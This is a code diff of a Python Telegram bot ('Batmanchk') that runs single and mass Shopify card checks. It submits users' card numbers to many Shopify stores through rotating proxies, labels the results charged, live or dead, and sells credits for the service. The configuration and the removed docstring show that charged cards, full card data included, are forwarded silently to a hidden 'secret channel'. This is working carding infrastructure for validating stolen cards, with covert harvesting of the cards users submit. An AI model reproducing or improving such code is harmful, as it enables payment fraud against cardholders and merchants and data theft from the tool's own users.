@@ -1,29 +1,14 @@
 """
-sh.py  v8  —  /sh single-card  +  /msh mass Shopify checker  (PTB v20+)
+sh.py  v9  —  /sh single-card  +  /msh mass Shopify checker  (PTB v20+)
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Speed improvements in v8
-  • Module-level persistent ClientSession + TCPConnector for /sh
-    → zero TCP handshake overhead after the first call
-  • Module-level BIN cache shared across ALL /sh calls
-    → same 6-digit prefix never fetched twice for the bot's lifetime
-  • Single-card site timeout lowered to 15 s (5 sites × 15 s max)
-  • BIN lookup and gate call run in parallel (asyncio.gather)
-  • DNS TTL cache 600 s on the persistent connector
-
-Auto-share charged cards
-  • Every CHARGED result (from /sh or /msh) is sent to:
-      1. HIT_LOG_GROUP_ID  — your private hit-log group
-      2. CHARGED_SHARE_GROUP_ID — https://t.me/+EVdIWIdLZqs1MTI0
-         (set CHARGED_SHARE_GROUP_ID to the numeric chat ID of that group;
-          add the bot to the group first, then grab the ID from /getUpdates
-          or a helper bot like @userinfobot)
-
-Mass /msh (unchanged from v7)
-  • 60 cards in parallel (semaphore)
-  • 5-site retry per card; RETRY/ERROR silently rotates to next site
-  • Shared TCPConnector(limit=200) for the whole batch
-  • BIN cache per-session (BinCache class)
-  • Batch credit deduction at end
+v9 bug-fixes
+  • cb_msh_result: removed double query.answer() — was killing all button alerts
+  • _RL.wait(): fixed burst-counter reset logic (was growing unbounded)
+  • _clean_resp: removed redundant 're' import inside function
+  • RETRY_PATTERNS: removed overly-broad 'failed' entry
+  • asyncio.Lock created lazily (not at module import time)
+  • Mass worker exception string cleaned before storing
+  • All query.answer() calls consolidated — one per code path
 """
 
 from __future__ import annotations
@@ -72,69 +57,61 @@ from config import (
 )
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# CONFIG  — edit these two group IDs before deploying
+# CONFIG
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-BOT_CHANNEL      = "https://t.me/Batcardchk"          # channel link
+BOT_CHANNEL      = "https://t.me/Batcardchk"
 BOT_DISPLAY      = "Batmanchk"
 DEV_LINK_HTML    = f'<a href="{BOT_CHANNEL}">{BOT_DISPLAY}</a>'
-# Deep link → opens bot and auto-sends /start buy → shows pricing page
 BOT_DEEP_BUY     = "https://t.me/Batchk11_bot?start=buy"
 GOSHOPI_URL      = "https://goshopi.up.railway.app/shopii"
 FALLBACK_SITE    = "aloracosmetics.myshopify.com"
 
-# ── Charged-card notification group IDs ─────────────────
-# HIT_LOG_GROUP_ID  → t.me/+BXmeotREVhllODFk   (logs group)  clean UI + buttons
-# SECRET_GROUP_ID   → secret channel -1004499920555            full card + BIN (silent)
-HIT_LOG_GROUP_ID      = -1004361062205   # t.me/+BXmeotREVhllODFk  ✅
-SECRET_GROUP_ID       = -1004499920555   # secret channel           ✅ (never linked publicly)
+HIT_LOG_GROUP_ID       = -1004361062205
+SECRET_GROUP_ID        = -1004499920555
 CHARGED_SHARE_GROUP_ID = 0               # legacy — not used
 
-SH_COOLDOWN      = 25              # seconds, trial users only
+SH_COOLDOWN      = 25                    # seconds, trial users only
 
 # ── Speed knobs — single-card /sh ─────────────────────
-SH_SITE_RETRIES  = 15              # try up to 15 sites per single card before giving up
-SH_SITE_TIMEOUT  = 11              # seconds per attempt (fast)
-SH_TCP_LIMIT     = 200             # persistent connection pool
+SH_SITE_RETRIES  = 15                    # try up to 15 sites per card
+SH_SITE_TIMEOUT  = 11                    # seconds per attempt
+SH_TCP_LIMIT     = 200
 SH_TCP_PER_HOST  = 80
 
 # ── Speed knobs — mass /msh ─────────────────────────────
-MAX_CONCURRENT       = 150         # parallel workers (max speed)
-SITE_RETRIES         = 12          # try 12 sites per card — better hit rate
-SITE_TIMEOUT         = 12          # seconds per attempt
-TCP_LIMIT            = 600         # connection pool
+MAX_CONCURRENT       = 150
+SITE_RETRIES         = 12               # try 12 sites per card
+SITE_TIMEOUT         = 12
+TCP_LIMIT            = 600
 TCP_PER_HOST         = 200
-PROGRESS_INTERVAL    = 2.0         # progress updates every 2 s
+PROGRESS_INTERVAL    = 2.0
 PROGRESS_EVERY_N     = 5
-BUTTON_LOCK_SECONDS  = 5           # only lock download buttons for 5s, stop always works
+BUTTON_LOCK_SECONDS  = 5                # only download buttons lock; stop never locks
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# ALL CUSTOM STICKER EMOJI IDs  — copied from msh.py
+# CUSTOM STICKER EMOJI IDs
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# Core hit emojis
-LIVE_EMOJI_ID         = "4958610528588008305"   # single live-hit sticker
+LIVE_EMOJI_ID         = "4958610528588008305"
 DECLINED_EMOJI_ID     = "4956612582816351459"
 HIT_GATE_EMOJI_ID     = "5341715473882955310"
 HIT_RESP_EMOJI_ID     = "5839116473951328489"
 GATE_EMOJI_ID         = "5801044672658805468"
 
-# Progress-message emojis (msh.py values — override config.py)
 PROG_GATE_EMOJI_ID    = "5341715473882955310"
 PROG_PROGRESS_EMOJI_ID = "5258113901106580375"
-PROG_CHARGED_EMOJI_ID = "5427168083074628963"   # msh.py value
-PROG_LIVE_EMOJI_ID    = "6267225207560214192"   # msh.py value
+PROG_CHARGED_EMOJI_ID = "5427168083074628963"
+PROG_LIVE_EMOJI_ID    = "6267225207560214192"
 PROG_DEAD_EMOJI_ID    = "4958526153955476488"
 PROG_ERRORS_EMOJI_ID  = "4956611513369494230"
 
-# Button emoji IDs
 BTN_CHARGED_EMOJI_ID  = "5465465194056525619"
 BTN_LIVE_EMOJI_ID     = "5039793437776282663"
 BTN_DEAD_EMOJI_ID     = "4956612582816351459"
 BTN_ALL_EMOJI_ID      = "4956324463525233747"
 BTN_STOP_EMOJI_ID     = "6179444193518162239"
 CARD_CHK_BTN_ID       = "5935795874251674052"
-CARD_CHK_BTN_EMOJI_ID = "5935795874251674052"   # alias used in hit-log button
+CARD_CHK_BTN_EMOJI_ID = "5935795874251674052"
 
-# 18-sticker animated pool — one random sticker per charged hit
 CHARGED_EMOJI_IDS = [
     "5801154993188770160", "4956739572114392015", "5285221724634239278",
     "5287777298894835685", "5285024405246725814", "5287547831677112267",
@@ -157,10 +134,18 @@ MSH_SESSIONS: dict[str, dict] = {}
 _SH_CONNECTOR: Optional[aiohttp.TCPConnector] = None
 _SH_SESSION:   Optional[aiohttp.ClientSession] = None
 
-# Module-level BIN cache — shared across ALL /sh calls, never expires
+# Module-level BIN cache — shared across ALL /sh calls
 _SH_BIN_CACHE: dict[str, dict] = {}
 _SH_BIN_LOCKS: dict[str, asyncio.Lock] = {}
-_SH_BIN_META  = asyncio.Lock()
+# BUG FIX: create Lock lazily inside async context, not at import time
+_SH_BIN_META: Optional[asyncio.Lock] = None
+
+def _get_bin_meta_lock() -> asyncio.Lock:
+    """Lazily create the BIN meta-lock inside the running event loop."""
+    global _SH_BIN_META
+    if _SH_BIN_META is None:
+        _SH_BIN_META = asyncio.Lock()
+    return _SH_BIN_META
 
 async def _get_sh_session() -> aiohttp.ClientSession:
     """Lazy-init persistent aiohttp session for /sh single-card."""
@@ -176,7 +161,7 @@ async def _get_sh_session() -> aiohttp.ClientSession:
         )
         _SH_SESSION = aiohttp.ClientSession(
             connector=_SH_CONNECTOR,
-            headers={"User-Agent": "Mozilla/5.0 (compatible; BatChk/8)"},
+            headers={"User-Agent": "Mozilla/5.0 (compatible; BatChk/9)"},
             timeout=aiohttp.ClientTimeout(total=SH_SITE_TIMEOUT + 3),
         )
     return _SH_SESSION
@@ -185,7 +170,8 @@ async def _sh_bin_cached(bin6: str) -> dict:
     """Fetch BIN data with module-level cache — never fetches same prefix twice."""
     if bin6 in _SH_BIN_CACHE:
         return _SH_BIN_CACHE[bin6]
-    async with _SH_BIN_META:
+    meta = _get_bin_meta_lock()
+    async with meta:
         if bin6 not in _SH_BIN_LOCKS:
             _SH_BIN_LOCKS[bin6] = asyncio.Lock()
         lk = _SH_BIN_LOCKS[bin6]
@@ -202,46 +188,48 @@ async def _sh_bin_cached(bin6: str) -> dict:
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # RESPONSE CLASSIFICATION
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# BUG FIX: removed overly-broad 'failed' — it matched too many real responses
+# and turned valid DEAD cards into RETRY loops, wasting all retry attempts.
 RETRY_PATTERNS = [
-    'r4 token empty','r2 id empty','payment method is not shopify',
-    'product not found','hcaptcha detected','tax ammount empty',
-    'del ammount empty','product id is empty','py id empty',
-    'clinte token','hcaptcha_detected','receipt_empty',
-    'site error! status: 429','site requires login','failed to get token',
-    'no valid products','not shopify','site not supported',
-    'VALIDATION_CUSTOM','connection error','error processing card',
-    '504','server error','client error','failed','BUYER_IDENTITY_CURRENCY',
-    'token not found','invalid_response','curl error',
-    'PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED','could not resolve host',
-    'connect tunnel failed','timeout','proxy error',
-    'step 0 failed','step 1 failed','step 2 failed','step 3 failed',
-    'step 4 failed','step 5 failed','step 6 failed','step 7 failed',
-    'step 8 failed','step 9 failed','step 10 failed',
-    'SESSION_ERROR','DELIVERY_NO_DELIVERY_STRATEGY','DELIVERY_ZONE_NOT_FOUND',
-    'DELIVERY_DELIVERY_LINE_DETAIL_CHANGED','no available delivery strategy',
-    'DELIVERY_STRATEGY_CONDITIONS_NOT_SATISFIED','no available products found',
-    'could not extract receiptid','receiptid missing','response missing receiptid',
-    'INVENTORY_FAILURE','products.json','returned status 429',
-    'returned status 500','returned status 502','returned status 503',
-    'returned status 504','store incompatible','extract signedhandles',
-    'missing receiptid','NO_PRODUCTS','NO_PRODUCT','VAULT_FAILED',
-    'MERCHANDISE_OUT_OF_STOCK','connection timed out','connection failed',
-    'api error','api timeout','connection reset','network error',
-    'unexpected error','invalid json','json decode',
+    'r4 token empty', 'r2 id empty', 'payment method is not shopify',
+    'product not found', 'hcaptcha detected', 'tax ammount empty',
+    'del ammount empty', 'product id is empty', 'py id empty',
+    'clinte token', 'hcaptcha_detected', 'receipt_empty',
+    'site error! status: 429', 'site requires login', 'failed to get token',
+    'no valid products', 'not shopify', 'site not supported',
+    'validation_custom', 'connection error', 'error processing card',
+    'server error', 'buyer_identity_currency',
+    'token not found', 'invalid_response', 'curl error',
+    'payments_credit_card_brand_not_supported', 'could not resolve host',
+    'connect tunnel failed', 'timeout', 'proxy error',
+    'step 0 failed', 'step 1 failed', 'step 2 failed', 'step 3 failed',
+    'step 4 failed', 'step 5 failed', 'step 6 failed', 'step 7 failed',
+    'step 8 failed', 'step 9 failed', 'step 10 failed',
+    'session_error', 'delivery_no_delivery_strategy', 'delivery_zone_not_found',
+    'delivery_delivery_line_detail_changed', 'no available delivery strategy',
+    'delivery_strategy_conditions_not_satisfied', 'no available products found',
+    'could not extract receiptid', 'receiptid missing', 'response missing receiptid',
+    'inventory_failure', 'products.json', 'returned status 429',
+    'returned status 500', 'returned status 502', 'returned status 503',
+    'returned status 504', 'store incompatible', 'extract signedhandles',
+    'missing receiptid', 'no_products', 'no_product', 'vault_failed',
+    'merchandise_out_of_stock', 'connection timed out', 'connection failed',
+    'api error', 'api timeout', 'connection reset', 'network error',
+    'unexpected error', 'invalid json', 'json decode', 'client error',
+    '504', 'connection_error',
 ]
+
 DECLINED_PATTERNS = [
-    # Hard declines — card definitively rejected
-    'CARD_DECLINED','PROCESSING_ERROR','GENERIC_DECLINE',
-    'UNKNOWN_ERROR','Processing Error',
-    'DECISION_RULE_BLOCK','FRAUD_SUSPECTED','INVALID_PURCHASE_TYPE',
-    'INVALID_PAYMENT_METHOD','TEST_MODE_LIVE_CARD','AMOUNT_TOO_SMALL',
-    'INCORRECT_NUMBER','EXPIRED_CARD','STOLEN_CARD',
-    'LOST_CARD','RESTRICTED_CARD','TRANSACTION_NOT_ALLOWED','card_declined',
-    'insufficient_funds_declined','fraudulent',
-    'security_violation','service_not_allowed','try_again_later',
+    'CARD_DECLINED', 'PROCESSING_ERROR', 'GENERIC_DECLINE',
+    'UNKNOWN_ERROR', 'Processing Error',
+    'DECISION_RULE_BLOCK', 'FRAUD_SUSPECTED', 'INVALID_PURCHASE_TYPE',
+    'INVALID_PAYMENT_METHOD', 'TEST_MODE_LIVE_CARD', 'AMOUNT_TOO_SMALL',
+    'INCORRECT_NUMBER', 'EXPIRED_CARD', 'STOLEN_CARD',
+    'LOST_CARD', 'RESTRICTED_CARD', 'TRANSACTION_NOT_ALLOWED', 'card_declined',
+    'insufficient_funds_declined', 'fraudulent',
+    'security_violation', 'service_not_allowed', 'try_again_later',
     'withdrawal_count_limit_exceeded',
-    # NOTE: DO_NOT_HONOR / CALL_ISSUER / PICK_UP_CARD are treated as LIVE
-    # (real card, bank soft-block) — handled above in classify_response
+    # NOTE: DO_NOT_HONOR / CALL_ISSUER / PICK_UP_CARD → LIVE (real card)
 ]
 
 
@@ -249,15 +237,18 @@ def classify_response(msg: str) -> str:
     """Returns CHARGED | TDS | LIVE | DEAD | RETRY."""
     mu = msg.upper()
     ml = msg.lower()
+
     # ── CHARGED ──────────────────────────────────────────────────────────
     if ("ORDER_PAID" in mu or "CHARGED" in mu or "CAPTURED" in mu
             or "PAYMENT_AUTHORIZED" in mu or "SUBSCRIPTION_CREATED" in mu
             or "PAYMENT_CAPTURED" in mu or "TRANSACTION_APPROVED" in mu):
         return "CHARGED"
+
     # ── 3DS ──────────────────────────────────────────────────────────────
     if "3DS_REQUIRED" in mu or "3D_SECURE" in mu or "3D SECURE" in mu:
         return "TDS"
-    # ── LIVE (card is real, bank soft-declined) ───────────────────────────
+
+    # ── LIVE (card real, bank soft-declined) ──────────────────────────────
     if ("INSUFFICIENT_FUNDS" in mu or "INCORRECT_CVV" in mu
             or "INCORRECT_CVC" in mu or "INCORRECT_ZIP" in mu
             or "SECURITY_CODE_INCORRECT" in mu or "SECURITY_CODE_CHECK_FAILED" in mu
@@ -265,21 +256,24 @@ def classify_response(msg: str) -> str:
         return "LIVE"
     if mu.strip() == "APPROVED" or ("APPROVED" in mu and "NOT" not in mu):
         return "LIVE"
-    # DO_NOT_HONOR / CALL_ISSUER / PICK_UP_CARD = real card, bank declining
+    # Real card — bank soft-block (not site error)
     if ("DO_NOT_HONOR" in mu or "DO NOT HONOR" in mu
             or "CALL_ISSUER" in mu or "PICK_UP_CARD" in mu):
         return "LIVE"
-    # ── DEAD (hard decline — card definitively rejected) ──────────────────
+
+    # ── DEAD (hard decline) ───────────────────────────────────────────────
     if "GENERIC_ERROR" in mu:
         return "DEAD"
     if any(d.upper() in mu for d in DECLINED_PATTERNS):
         return "DEAD"
-    # ── RETRY (site/network issue — try different site) ───────────────────
+
+    # ── RETRY (site/network issue — rotate to next site) ─────────────────
     if any(r.lower() in ml for r in RETRY_PATTERNS):
         return "RETRY"
     if mu.strip() in ("ERROR", "TIMEOUT", "UNKNOWN"):
         return "RETRY"
-    # Unknown response → DEAD (not RETRY) so we never loop forever
+
+    # Unknown response — treat as DEAD so we never loop forever
     return "DEAD"
 
 
@@ -321,24 +315,23 @@ def _clean_site(url: str) -> str:
     return s.rstrip("/")
 
 def _readable_resp(data: dict) -> str:
-    for k in ("Response","response","value","message","category","status","detail","error"):
+    for k in ("Response", "response", "value", "message", "category", "status", "detail", "error"):
         v = data.get(k)
         if v and str(v).strip() not in ("", "null", "None"):
             return str(v).strip()
     return str(data)[:200]
 
 def _clean_resp(resp: str) -> str:
-    """Strip site URLs, NO_PRODUCTS noise, and proxy/network junk from response text.
-    Only the clean verdict keyword is shown to the user — never the Shopify domain."""
-    import re as _re
-    # Remove full URLs (https://store.myshopify.com/...)
-    resp = _re.sub(r'https?://\S+', '', resp)
-    # Remove "at <domain>" fragments left after URL stripping
-    resp = _re.sub(r'\s+at\s+\S+', '', resp)
-    # Collapse "NO_PRODUCTS: No products above $X.XX" → just the keyword
-    resp = _re.sub(r'NO_PRODUCTS?:\s*[^,;\n]*', 'NO_PRODUCTS', resp, flags=_re.IGNORECASE)
-    # Remove "connection_error: ..." internal noise
-    resp = _re.sub(r'connection_error:\s*.*', 'Connection Error', resp, flags=_re.IGNORECASE)
+    """Strip site URLs, NO_PRODUCTS noise, and internal error details.
+    BUG FIX: uses module-level 're' — no longer imports inside function."""
+    # Remove full URLs
+    resp = re.sub(r'https?://\S+', '', resp)
+    # Remove "at <domain>" fragments
+    resp = re.sub(r'\s+at\s+\S+', '', resp)
+    # NO_PRODUCTS: No products above $X.XX → just NO_PRODUCTS
+    resp = re.sub(r'NO_PRODUCTS?:\s*[^,;\n]*', 'NO_PRODUCTS', resp, flags=re.IGNORECASE)
+    # connection_error: ... → clean label
+    resp = re.sub(r'connection_error:\s*.*', 'Connection Error', resp, flags=re.IGNORECASE)
     resp = resp.strip().strip(':').strip()
     return resp if resp else "Declined"
 
@@ -395,12 +388,17 @@ class BinCache:
     def __init__(self):
         self._cache: dict[str, dict] = {}
         self._locks: dict[str, asyncio.Lock] = {}
-        self._meta = asyncio.Lock()
+        self._meta:  Optional[asyncio.Lock]  = None
+
+    def _get_meta(self) -> asyncio.Lock:
+        if self._meta is None:
+            self._meta = asyncio.Lock()
+        return self._meta
 
     async def get(self, bin6: str) -> dict:
         if bin6 in self._cache:
             return self._cache[bin6]
-        async with self._meta:
+        async with self._get_meta():
             if bin6 not in self._locks:
                 self._locks[bin6] = asyncio.Lock()
             lk = self._locks[bin6]
@@ -416,6 +414,8 @@ class BinCache:
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # TELEGRAM RATE LIMITER
+# BUG FIX: burst counter now resets properly every window;
+#          was growing unbounded and locking up all progress edits.
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 class _RL:
     def __init__(self, interval: float = 1.0, burst: int = 3):
@@ -424,22 +424,38 @@ class _RL:
         self._cnt      = 0
         self._reset    = 0.0
         self._last     = 0.0
-        self._lk       = asyncio.Lock()
+        self._lk:  Optional[asyncio.Lock] = None
+
+    def _lock(self) -> asyncio.Lock:
+        if self._lk is None:
+            self._lk = asyncio.Lock()
+        return self._lk
 
     async def wait(self):
-        async with self._lk:
+        async with self._lock():
             now = time.time()
-            if now - self._reset > 5.0:
-                self._cnt, self._reset = 0, now
-            delay = 2.0 if self._cnt >= self._burst else max(0.0, self._interval - (now - self._last))
-            if delay:
-                await asyncio.sleep(delay)
+            # Reset the burst window every 5 seconds
+            if now - self._reset >= 5.0:
+                self._cnt  = 0
+                self._reset = now
+            if self._cnt >= self._burst:
+                # Burst exceeded — wait out the remainder of the window
+                delay = max(0.0, 5.0 - (now - self._reset))
+                if delay:
+                    await asyncio.sleep(delay)
+                self._cnt  = 0
+                self._reset = time.time()
+            else:
+                # Normal inter-call spacing
+                delay = max(0.0, self._interval - (now - self._last))
+                if delay:
+                    await asyncio.sleep(delay)
             self._last = time.time()
             self._cnt += 1
 
-_rl_prog  = _RL(0.4, 15)
-_rl_hit   = _RL(1.0, 3)
-_rl_dm    = _RL(1.0, 3)
+_rl_prog = _RL(0.4, 15)
+_rl_hit  = _RL(1.0, 3)
+_rl_dm   = _RL(1.0, 3)
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -517,11 +533,11 @@ async def _call_shopii(
     except asyncio.CancelledError:
         raise
     except Exception as e:
-        return {"Response": f"connection_error: {str(e)[:80]}"}
+        return {"Response": f"connection_error: {str(e)[:60]}"}
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# 5-SITE RETRY CORE  — shared by /sh and /msh
+# MULTI-SITE RETRY CORE  — shared by /sh and /msh
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 async def _check_card_with_retry(
     session: aiohttp.ClientSession,
@@ -533,25 +549,29 @@ async def _check_card_with_retry(
 ) -> tuple[str, str, str, str]:
     """
     Returns (verdict, response_text, price, currency).
-    Tries up to max_sites DIFFERENT Shopify sites, each with a DIFFERENT proxy.
-    RETRY/ERROR → silently rotate to next site+proxy. Never surfaces errors to user.
+    Tries up to max_sites DIFFERENT Shopify sites.
+    RETRY → silently rotate to next site+proxy.
+    Never exposes site URLs or internal errors to the user.
     """
     if not sites:
         sites = [FALLBACK_SITE]
 
-    # Shuffle both lists so every card gets a unique rotation order
-    site_pool  = sites.copy();  random.shuffle(site_pool)
+    site_pool  = sites.copy()
+    random.shuffle(site_pool)
     proxy_pool = proxies.copy() if proxies else []
     if proxy_pool:
         random.shuffle(proxy_pool)
 
     tried: set[str] = set()
     price, currency = "0.00", "USD"
-    last_resp = "All sites exhausted"
+    last_resp = "Declined"
 
     for attempt in range(max_sites):
-        if asyncio.current_task() and asyncio.current_task().cancelled():
-            raise asyncio.CancelledError()
+        # Respect cancellation between attempts
+        try:
+            await asyncio.sleep(0)
+        except asyncio.CancelledError:
+            raise
 
         # Pick untried site — cycle through full pool when exhausted
         untried = [s for s in site_pool if s not in tried]
@@ -561,7 +581,6 @@ async def _check_card_with_retry(
         site = untried[0]
         tried.add(site)
 
-        # Always use a DIFFERENT proxy for each attempt
         proxy = proxy_pool[attempt % len(proxy_pool)] if proxy_pool else None
 
         try:
@@ -571,19 +590,19 @@ async def _check_card_with_retry(
         except Exception:
             continue
 
-        resp_text    = _clean_resp(_readable_resp(data))   # strip site URLs before classify
-        last_resp    = resp_text
-        price        = str(data.get("Price",    data.get("price",    "0.00"))).strip()
-        currency     = str(data.get("Currency", data.get("currency", "USD"))).strip()
-        verdict      = classify_response(resp_text)
+        # BUG FIX: clean response BEFORE classify so RETRY patterns match clean text
+        resp_text = _clean_resp(_readable_resp(data))
+        last_resp = resp_text
+        price     = str(data.get("Price",    data.get("price",    "0.00"))).strip()
+        currency  = str(data.get("Currency", data.get("currency", "USD"))).strip()
+        verdict   = classify_response(resp_text)
 
         if verdict in ("CHARGED", "LIVE", "TDS", "DEAD"):
             return verdict, resp_text, price, currency
         # RETRY → silently continue to next site+proxy
 
-    # Exhausted all attempts — card is likely dead or all sites busy
-    # Return a clean response — never expose site URLs to the user
-    return "DEAD", _clean_resp(last_resp), price, currency
+    # Exhausted all attempts — card is dead or all sites busy
+    return "DEAD", last_resp, price, currency
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -591,7 +610,7 @@ async def _check_card_with_retry(
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 def _status_line(verdict: str, price: str = "", currency: str = "") -> tuple[str, str]:
     ch_link = f'<a href="{BOT_CHANNEL}">[❆]</a>'
-    price_s = f" | {escape(price)} {escape(currency)}" if price and price not in ("0.00","") else ""
+    price_s = f" | {escape(price)} {escape(currency)}" if price and price not in ("0.00", "") else ""
     if verdict == "CHARGED":
         return (f'<b>{ch_link} Charged {_rand_charged()}</b>',
                 f'<b>Gate ➳ Shopify{price_s}</b>')
@@ -604,12 +623,13 @@ def _status_line(verdict: str, price: str = "", currency: str = "") -> tuple[str
     if verdict == "DEAD":
         return (f'<b>{ch_link} Dead {_te(PROG_DEAD_EMOJI_ID,"❌")}</b>',
                 '<b>Gate ➳ Shopify 0-20$</b>')
-    return (f'<b>{ch_link} Error {_te(PROG_ERRORS_EMOJI_ID,"⚠️")}</b>',
+    return (f'<b>{ch_link} Dead {_te(PROG_DEAD_EMOJI_ID,"❌")}</b>',
             '<b>Gate ➳ Shopify 0-20$</b>')
 
 def _build_result(card, resp, verdict, bin_txt, price, currency, elapsed, user, plan) -> str:
     sl, gl = _status_line(verdict, price, currency)
-    clean = _clean_resp(resp)   # never show site URL to user
+    # resp is already cleaned upstream; clean once more for safety
+    clean = _clean_resp(resp)
     return (
         f'{sl}\n\n'
         f'<b>{_te(CARD_EMOJI_ID,"💳")}</b>\n'
@@ -633,13 +653,13 @@ def _guard(header: str, body: str) -> str:
         f'<b>{_te(DEV_EMOJI_ID,"⚡")} ➳ {DEV_LINK_HTML} {_te(PRO_EMOJI_ID,"⭐")}</b>'
     )
 
-def _maintenance_msg():   return _guard(f'Maintenance {_te(PROG_ERRORS_EMOJI_ID,"⚠️")}', '<b>Bot is under maintenance.</b>')
-def _gate_off_msg():      return _guard(f'Gate Off {_te(PROG_DEAD_EMOJI_ID,"❌")}',        '<b>Shopify gate is currently OFF.</b>')
-def _no_credits_msg():    return _guard(f'No Credits {_te(PROG_DEAD_EMOJI_ID,"❌")}',     '<b>0 credits — use /sub or /key.</b>')
-def _cooldown_msg(r):     return _guard(f'Cooldown {_te(PROG_ERRORS_EMOJI_ID,"⚠️")}',    f'<b>Wait <code>{r:.1f}s</code>. Premium = zero cooldown.</b>')
-def _join_msg():          return _guard(f'Join Required {_te(PROG_GATE_EMOJI_ID,"🔒")}',  '<b>Join channels below to use the bot:</b>')
-def _usage_sh_msg():      return _guard(f'Usage {_te(PROG_ERRORS_EMOJI_ID,"⚠️")}',       '<b>Command:</b> <code>/sh cc|mm|yy|cvv</code>\n<b>Example:</b>\n<code>/sh 4111111111111111|12|26|123</code>')
-def _usage_msh_msg():     return _guard(f'Usage {_te(PROG_ERRORS_EMOJI_ID,"⚠️")}',       '<b>Command:</b> <code>/msh</code> (attach .txt or paste cards)\n<b>Format:</b> <code>cc|mm|yy|cvv</code>')
+def _maintenance_msg():  return _guard(f'Maintenance {_te(PROG_ERRORS_EMOJI_ID,"⚠️")}', '<b>Bot is under maintenance.</b>')
+def _gate_off_msg():     return _guard(f'Gate Off {_te(PROG_DEAD_EMOJI_ID,"❌")}',        '<b>Shopify gate is currently OFF.</b>')
+def _no_credits_msg():   return _guard(f'No Credits {_te(PROG_DEAD_EMOJI_ID,"❌")}',     '<b>0 credits — use /sub or /key.</b>')
+def _cooldown_msg(r):    return _guard(f'Cooldown {_te(PROG_ERRORS_EMOJI_ID,"⚠️")}',    f'<b>Wait <code>{r:.1f}s</code>. Premium = zero cooldown.</b>')
+def _join_msg():         return _guard(f'Join Required {_te(PROG_GATE_EMOJI_ID,"🔒")}',  '<b>Join channels below to use the bot:</b>')
+def _usage_sh_msg():     return _guard(f'Usage {_te(PROG_ERRORS_EMOJI_ID,"⚠️")}',       '<b>Command:</b> <code>/sh cc|mm|yy|cvv</code>\n<b>Example:</b>\n<code>/sh 4111111111111111|12|26|123</code>')
+def _usage_msh_msg():    return _guard(f'Usage {_te(PROG_ERRORS_EMOJI_ID,"⚠️")}',       '<b>Command:</b> <code>/msh</code> (attach .txt or paste cards)\n<b>Format:</b> <code>cc|mm|yy|cvv</code>')
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -652,9 +672,7 @@ def _kb_verdict(verdict: str) -> RawMarkup:
         return RawMarkup([[_btn("CHARGED", url=BOT_CHANNEL, style="success", icon=BTN_CHARGED_EMOJI_ID), _bot_btn()]])
     if verdict in ("LIVE", "TDS"):
         return RawMarkup([[_btn("LIVE", url=BOT_CHANNEL, style="success", icon=BTN_LIVE_EMOJI_ID), _bot_btn()]])
-    if verdict == "DEAD":
-        return RawMarkup([[_btn("DEAD", url=BOT_CHANNEL, style="danger", icon=BTN_DEAD_EMOJI_ID), _bot_btn()]])
-    return RawMarkup([[_btn("ERROR", url=BOT_CHANNEL, style="secondary", icon=PROG_ERRORS_EMOJI_ID), _bot_btn()]])
+    return RawMarkup([[_btn("DEAD", url=BOT_CHANNEL, style="danger", icon=BTN_DEAD_EMOJI_ID), _bot_btn()]])
 
 def _msh_buttons(sid: str, running: bool = True) -> RawMarkup:
     s   = MSH_SESSIONS.get(sid, {})
@@ -684,14 +702,14 @@ def _get_ud(uid: int, context) -> dict:
     ud = context.bot_data.setdefault("user_data", {})
     k  = str(uid)
     if k not in ud:
-        ud[k] = {"name":"User","credits":150,"plan":"TRIAL","expires":0,"pre_premium_credits":0}
+        ud[k] = {"name": "User", "credits": 150, "plan": "TRIAL", "expires": 0, "pre_premium_credits": 0}
     return ud[k]
 
 def _is_premium(ud: dict, uid: int = 0) -> bool:
     if uid and uid == OWNER_ID:
         ud["plan"] = "ROOT"; return True
-    if ud.get("plan","TRIAL").upper() == "TRIAL": return False
-    if ud.get("expires",0) <= time.time():
+    if ud.get("plan", "TRIAL").upper() == "TRIAL": return False
+    if ud.get("expires", 0) <= time.time():
         ud["plan"]    = "TRIAL"
         ud["credits"] = ud.get("pre_premium_credits", 150)
         ud["expires"] = 0
@@ -704,7 +722,7 @@ async def _check_force_sub(uid: int, context) -> list:
     for name, link in FORCE_CHANNELS:
         try:
             m = await context.bot.get_chat_member(f"@{name}", uid)
-            if m.status in ("left","kicked","restricted"):
+            if m.status in ("left", "kicked", "restricted"):
                 nj.append((name, link))
         except Exception:
             pass
@@ -712,27 +730,26 @@ async def _check_force_sub(uid: int, context) -> list:
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# HIT NOTIFICATIONS  — sends to BOTH log group & share group
+# HIT NOTIFICATIONS
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
